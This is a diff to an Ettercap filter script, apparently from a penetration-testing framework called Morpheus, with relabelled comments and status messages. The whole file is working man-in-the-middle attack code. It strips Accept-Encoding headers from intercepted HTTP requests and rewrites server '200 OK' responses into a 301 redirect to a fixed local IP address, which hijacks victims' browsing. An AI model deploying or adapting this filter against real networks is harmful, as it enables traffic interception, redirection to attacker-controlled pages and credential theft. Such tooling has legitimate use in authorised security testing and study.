@@ -1,8 +1,8 @@
 ############################################################################
 #                                                                          #
-#  nr.filter -- filter source file                                         #
-#  Based on work by Irongeek and others http://www.irongeek.com/           #
-#                                                                          #   
+#  HTTPS Request/Response Filter                                           #
+#  based on code from ALoR & NaGA                                          #
+#                                                                          #
 #  This program is free software; you can redistribute it and/or modify    #
 #  it under the terms of the GNU General Public License as published by    #
 #  the Free Software Foundation; either version 2 of the License, or       #
@@ -10,19 +10,30 @@
 #                                                                          #
 ############################################################################
 
+##
+#  This filter will redirect target request 
+#  to the specified ip address.
+##
 
+
+##########################
+## Zap Content Encoding ##
+##########################
 if (ip.proto == TCP && tcp.dst == 80){
    if (search(DATA.data, "Accept-Encoding")){
     replace("Accept-Encoding", "Accept-Rubbish!");
-    msg("Zapped!");
+    msg("[Morpheus Filter] Encoding zapped.\n");
    }
 }
 
 
+#####################
+## Replace Content ##
+#####################
 if (ip.proto == TCP && tcp.src == 80){
  replace("200 OK", "301 Moved Permanently
  Location: http://192.168.200.201/
 ");
 
-msg("redirect success\n");
+msg("[Morpheus Filter] redirect successefully...\n");
 }
